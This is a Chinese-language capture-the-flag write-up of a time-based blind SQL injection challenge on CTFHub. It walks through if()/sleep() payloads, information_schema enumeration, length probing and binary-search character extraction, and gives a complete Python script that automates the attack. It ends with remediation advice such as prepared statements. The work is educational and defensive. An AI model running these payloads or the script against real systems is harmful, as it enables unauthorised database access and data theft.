CTFHub - Web - SQL注入 - 时间盲注

# CTFHub # Web # SQL注入 # 时间盲注 # sleep() # 二分法

一、题目信息

  • 题目名称：时间盲注
  • 题目方向：Web - SQL注入
  • 题目环境：动态分配的 HTTP 服务地址
  • 题目目标：利用条件成立时的响应延迟逐字符提取 flag。

二、判断注入点

页面提供 id 查询参数，提交 id=1 后会回显服务端执行的 SQL 语句，但不会返回查询结果：

select * from news where id=1

参数直接拼接在 id= 后，没有单引号包裹，属于整数型注入点。时间盲注无法通过页面内容判断真假，因此使用 MySQL 的 if() 与 sleep() 构造延迟：

id=1 and if(1=1,sleep(2),0)
id=1 and if(1=2,sleep(2),0)

实测结果如下：

baseline_ms=200
true_payload_ms=2197
false_payload_ms=201

真条件请求约延迟 2 秒，假条件与基线基本一致，确认存在时间盲注。

三、确认数据库结构

使用 information_schema.tables 判断当前数据库中是否存在 flag 表：

id=1 and if((
  select count(*) from information_schema.tables
  where table_schema=database() and table_name='flag'
)>0,sleep(1),0)

请求出现约 1 秒延迟，说明目标表存在。继续判断 flag 表中是否存在同名字段：

id=1 and if((
  select count(*) from information_schema.columns
  where table_schema=database()
  and table_name='flag'
  and column_name='flag'
)>0,sleep(1),0)

该条件同样产生延迟，确认数据位于 flag.flag。实际提取时使用 group_concat()，可以把查询结果整理为单个字符串：

select group_concat(flag) from flag

四、确定 Flag 长度

通过 length() 判断结果长度。下面的条件成立时触发 sleep(1)：

id=1 and if(length((
  select group_concat(flag) from flag
))=32,sleep(1),0)

请求延迟约 1 秒，因此 flag 长度为 32 个字符。未知长度时，可以把相等判断改成大于判断，并在 0 到 255 之间二分。

五、二分提取字符

使用 substr() 截取指定位置的字符，再用 ascii() 转成 ASCII 码。将 ASCII 码与区间中点比较，根据是否延迟收缩范围：

id=1 and if((
  ascii(substr((
    select group_concat(flag) from flag
  ),position,1))
)>midpoint,sleep(1),0)

例如判断第 1 个字符是否大于 ASCII 码 100：

id=1 and if(ascii(substr((
  select group_concat(flag) from flag
),1,1))>100,sleep(1),0)

ASCII 可打印字符范围为 32 到 126，因此每个字符最多比较 7 次即可确定。

六、自动化提取脚本

由于网络抖动可能让错误请求偶然超过阈值，脚本使用 1 秒延迟，并对处于临界区间的请求自动重测。提取完成后，再用整串相等条件进行复核：

import time
import requests

URL = "http://target/"
DELAY = 1.0
THRESHOLD = 0.65
QUERY = "select group_concat(flag) from flag"

session = requests.Session()
session.trust_env = False

def request_elapsed(condition):
    payload = f"1 and if({condition},sleep({DELAY}),0)"
    start = time.monotonic()
    response = session.get(URL, params={"id": payload}, timeout=15)
    response.raise_for_status()
    return time.monotonic() - start

def probe(condition):
    samples = []
    for _ in range(3):
        elapsed = request_elapsed(condition)
        if elapsed >= THRESHOLD + 0.2:
            return True
        if elapsed < THRESHOLD - 0.2:
            return False
        samples.append(elapsed >= THRESHOLD)
    return sum(samples) >= 2

def integer_gt(expression, midpoint):
    return probe(f"({expression}) > {midpoint}")

def recover_length(query):
    low, high = 0, 255
    while low < high:
        mid = (low + high) // 2
        if integer_gt(f"length(({query}))", mid):
            low = mid + 1
        else:
            high = mid
    return low

def recover_char(query, position):
    low, high = 0, 127
    expression = f"ascii(substr(({query}),{position},1))"
    while low < high:
        mid = (low + high) // 2
        if integer_gt(expression, mid):
            low = mid + 1
        else:
            high = mid
    return chr(low)

length = recover_length(QUERY)
flag = "".join(recover_char(QUERY, i) for i in range(1, length + 1))

assert probe(f"binary(({QUERY})) = binary '{flag}'")
print(flag)

时间盲注的关键不是页面内容，而是响应时间。延迟过短容易受网络抖动影响，延迟过长则会显著增加提取耗时；本题使用 1 秒延迟可以兼顾稳定性与速度。

七、提取与复核结果

脚本在提取出完整字符串后，执行了整串相等条件复核，服务端再次产生约 1 秒延迟，确认结果正确：

八、最终 Flag

九、修复建议

  • 使用预处理语句和参数绑定，禁止将用户输入直接拼接进 SQL 语句。
  • 对 id 等参数执行严格的数据类型和取值范围校验。
  • 限制数据库账号权限，避免业务账号访问无关表和 information_schema。
  • 设置合理的数据库与 Web 请求超时时间，降低时间侧信道的影响。

十、解题总结

时间盲注适用于页面既没有查询结果，也没有明显真假响应差异的场景。本题使用 if() 和 sleep() 把 SQL 条件转换成响应时间，再通过 length()、substr() 与 ascii() 逐字符二分提取 flag。最终结果经过整串相等条件复核，有效排除了网络抖动造成的单字符误判。
